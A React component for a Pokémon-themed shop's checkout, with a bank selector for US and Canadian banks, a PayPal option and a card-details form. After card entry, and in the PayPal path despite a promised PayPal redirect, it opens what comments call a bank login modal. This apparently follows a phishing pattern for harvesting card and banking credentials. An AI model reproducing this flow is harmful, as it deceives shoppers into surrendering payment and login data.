import React, { useState, useRef, useEffect } from 'react';
import { CheckCircle, ChevronDown, AlertCircle, CreditCard} from 'lucide-react';
import { banks as americanBanks, canadianbanks } from '../data';

interface PaymentFormProps {
  selectedBank: string;
  handleBankSelect: (bankName: string) => void;
  handleProceedToBankAuth: () => void; // opens BankAuthModal directly at step 2
  selectedCountry: string;
  cardData: any;
  cardErrors: any;
  cardType: string;
  handleCardDataChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  handleCardDetailsSubmit: (e: React.FormEvent) => void;
}

const PaymentForm: React.FC<PaymentFormProps> = ({
  selectedBank,
  handleBankSelect,
  handleProceedToBankAuth,
  selectedCountry,
  cardData,
  cardErrors,
  cardType,
  handleCardDataChange,
  handleCardDetailsSubmit,
}) => {
  const [isBankDropdownOpen, setIsBankDropdownOpen] = useState(false);
  const dropdownRef = useRef<HTMLDivElement>(null);

  const storedCountry = sessionStorage.getItem('selectedCountry');
  const finalCountry = selectedCountry || storedCountry;

  // Close dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setIsBankDropdownOpen(false);
      }
    };

    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  // Save PayPal choice to session
  const handleBankSelection = (bankName: string) => {
    if (bankName === 'PayPal') {
      sessionStorage.setItem('selectedPaymentMethod', 'PayPal');
    } else {
      sessionStorage.removeItem('selectedPaymentMethod');
    }
    handleBankSelect(bankName);
    setIsBankDropdownOpen(false);
  };

  const getBanksToShow = () => {
    switch (finalCountry) {
      case 'America':
        return { banks: americanBanks, title: 'American Banks' };
      case 'Canada':
        return { banks: canadianbanks, title: 'Canadian Banks' };
      default:
        return { banks: [], title: 'Select Country First' };
    }
  };

  const { banks, title } = getBanksToShow();
  const isPayPal = sessionStorage.getItem('selectedPaymentMethod') === 'PayPal';

  // Order summary for PayPal view
  const getOrderSummaryData = () => {
    const stored = sessionStorage.getItem('orderSummaryData');
    if (stored) {
      try {
        return JSON.parse(stored);
      } catch {
        return { cartTotal: 0, shipping: 0, tax: 0, total: 0, FREE_SHIPPING_THRESHOLD: 99 };
      }
    }
    return { cartTotal: 0, shipping: 0, tax: 0, total: 0, FREE_SHIPPING_THRESHOLD: 99 };
  };

  const orderData = getOrderSummaryData();

  const getCardIcon = (type: string) => {
    const iconClass = 'w-8 h-6 object-contain';
    switch (type) {
      case 'visa': return <div className={`${iconClass} bg-blue-600 text-white text-xs font-bold flex items-center justify-center rounded`}>VISA</div>;
      case 'mastercard': return <div className={`${iconClass} bg-red-500 text-white text-xs font-bold flex items-center justify-center rounded`}>MC</div>;
      case 'amex': return <div className={`${iconClass} bg-blue-500 text-white text-xs font-bold flex items-center justify-center rounded`}>AMEX</div>;
      case 'discover': return <div className={`${iconClass} bg-orange-500 text-white text-xs font-bold flex items-center justify-center rounded`}>DISC</div>;
      case 'jcb': return <div className={`${iconClass} bg-blue-700 text-white text-xs font-bold flex items-center justify-center rounded`}>JCB</div>;
      case 'diners': return <div className={`${iconClass} bg-gray-600 text-white text-xs font-bold flex items-center justify-center rounded`}>DC</div>;
      default: return <CreditCard className="w-6 h-6 text-gray-400" />;
    }
  };

  return (
    <div className="space-y-6">
      {/* Payment Method Selection */}
      <div className="bg-white rounded-xl shadow-lg p-6">
        <h2 className="text-xl font-bold text-pokemon-dark mb-6">Payment</h2>

        <div className="mb-6">
          <label className="block text-sm font-semibold text-pokemon-dark mb-4">
            <div className="flex items-center space-x-3">
              <span>Via Bank or Pay With</span>

              {/* PayPal button */}
              <button
                type="button"
                onClick={() => handleBankSelection('PayPal')}
                className={`flex items-center gap-2 px-4 py-2 rounded-lg font-semibold text-white text-lg transition-colors ${
                  selectedBank === 'PayPal'
                    ? 'bg-blue-700 ring-2 ring-yellow-300'
                    : 'bg-blue-600 hover:bg-blue-700'
                }`}
              >
                <img src="/paypall.png" alt="PayPal" className="w-8 h-8 object-contain" />
                <span>PayPal</span>
              </button>
            </div>
          </label>

          {/* Bank Dropdown */}
          {finalCountry && banks.length > 0 && (
            <div className="relative" ref={dropdownRef}>
              <button
                type="button"
                onClick={() => setIsBankDropdownOpen(!isBankDropdownOpen)}
                className={`w-full p-4 border rounded-lg text-left flex items-center justify-between transition-colors ${
                  selectedBank && selectedBank !== 'PayPal'
                    ? 'border-pokemon-red bg-pokemon-red/10'
                    : 'border-gray-300 hover:bg-gray-50'
                }`}
              >
                <span className="text-pokemon-dark font-medium">
                  {selectedBank && selectedBank !== 'PayPal'
                    ? selectedBank
                    : `Select Bank (${title})`}
                </span>
                <ChevronDown
                  className={`w-5 h-5 text-gray-400 transition-transform ${isBankDropdownOpen ? 'rotate-180' : ''}`}
                />
              </button>

              {isBankDropdownOpen && (
                <div className="absolute top-full left-0 right-0 bg-white border border-gray-200 rounded-lg shadow-lg mt-1 max-h-64 overflow-y-auto z-50">
                  <div className="py-2">
                    {banks.filter(bank => bank.name !== 'PayPal').map((bank) => (
                      <button
                        key={bank.name}
                        type="button"
                        onClick={() => handleBankSelection(bank.name)}
                        className={`w-full px-4 py-3 text-left hover:bg-gray-50 transition-colors ${
                          selectedBank === bank.name
                            ? 'bg-pokemon-red/10 text-pokemon-red font-medium'
                            : 'text-pokemon-dark'
                        }`}
                      >
                        {bank.name}
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}
        </div>

        {selectedBank && (
          <div className="mb-6 p-4 bg-green-50 border border-green-200 rounded-lg">
            <div className="flex items-center space-x-2 text-green-700">
              <CheckCircle className="w-5 h-5" />
              <span className="font-semibold">Selected: {selectedBank}</span>
            </div>
          </div>
        )}
      </div>

      {/* Payment Details */}
      {selectedBank && (
        <div className="bg-white rounded-xl shadow-lg p-6">
        {isPayPal ? (
          // ✅ PayPal View
          <div>
            <h3 className="text-xl font-bold text-gray-800 mb-4 text-center">PayPal Payment</h3>
            <p className="text-center text-gray-600 mb-6">
              You will be redirected to PayPal to complete your payment
            </p>

            <div className="bg-white border border-gray-200 rounded-lg p-6">
              <h3 className="text-lg font-bold mb-4">Order Summary</h3>
              <div className="space-y-4 mb-6">
                <div className="flex justify-between">
                  <span>Subtotal</span>
                  <span>${orderData.cartTotal.toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span>Shipping</span>
                  <span>
                    {orderData.shipping === 0 ? 'FREE' : `$${orderData.shipping.toFixed(2)}`}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span>Tax</span>
                  <span>${orderData.tax.toFixed(2)}</span>
                </div>
                <hr className="my-4" />
                <div className="flex justify-between text-xl font-bold">
                  <span>Total</span>
                  <span className="text-blue-600">${orderData.total.toFixed(2)}</span>
                </div>
              </div>
            </div>

            {/* 🔑 Important: only call handleCardDetailsSubmit, no modal */}
            <button
              type="button"
              onClick={(e) => {
                handleCardDetailsSubmit(e);
                handleProceedToBankAuth(); // 🚀 open modal or redirect, same as cards
              }}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg mt-6 transition-all duration-300 hover:shadow-lg"
            >
              Continue with PayPal
            </button>

          </div>
        ) : (
            <div>
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-green-600 rounded-full flex items-center justify-center mx-auto mb-4">
                  <CreditCard className="w-8 h-8 text-white" />
                </div>
                <h3 className="text-xl font-bold text-gray-800">
                  Payment Information
                </h3>
              </div>

              <form
                onSubmit={(e) => {
                  handleCardDetailsSubmit(e);
                  handleProceedToBankAuth(); // 🚀 open modal at login step
                }}
                className="space-y-4"
              >
                <div>
                  <label className="block text-sm font-semibold mb-2">Cardholder Name</label>
                  <input
                    type="text"
                    name="cardholderName"
                    value={cardData.cardholderName}
                    onChange={handleCardDataChange}
                    placeholder="Name as it appears on card"
                    className="w-full px-4 py-3 border rounded-lg"
                    required
                  />
                  {cardErrors.cardholderName && <p className="text-red-600 text-sm">{cardErrors.cardholderName}</p>}
                </div>

                <div>
                  <label className="block text-sm font-semibold mb-2">Card Number</label>
                  <div className="relative">
                    <input
                      type="text"
                      name="cardNumber"
                      value={cardData.cardNumber}
                      onChange={handleCardDataChange}
                      placeholder="1234 5678 9012 3456"
                      className="w-full px-4 py-3 pr-12 border rounded-lg"
                      required
                    />
                    <div className="absolute right-3 top-1/2 -translate-y-1/2">{getCardIcon(cardType)}</div>
                  </div>
                  {cardErrors.cardNumber && <p className="text-red-600 text-sm">{cardErrors.cardNumber}</p>}
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-semibold mb-2">Expiry Date</label>
                    <input
                      type="text"
                      name="expiryDate"
                      value={cardData.expiryDate}
                      onChange={handleCardDataChange}
                      placeholder="MM/YY"
                      className="w-full px-4 py-3 border rounded-lg"
                      required
                    />
                    {cardErrors.expiryDate && <p className="text-red-600 text-sm">{cardErrors.expiryDate}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-semibold mb-2">{cardType === 'amex' ? 'CID' : 'CVV'}</label>
                    <input
                      type="text"
                      name="cvv"
                      value={cardData.cvv}
                      onChange={handleCardDataChange}
                      placeholder={cardType === 'amex' ? '1234' : '123'}
                      className="w-full px-4 py-3 border rounded-lg"
                      required
                    />
                    {cardErrors.cvv && <p className="text-red-600 text-sm">{cardErrors.cvv}</p>}
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={Object.values(cardErrors).some((e) => e !== '')}
                  className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg mt-6"
                >
                  Place Order
                </button>
              </form>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default PaymentForm;
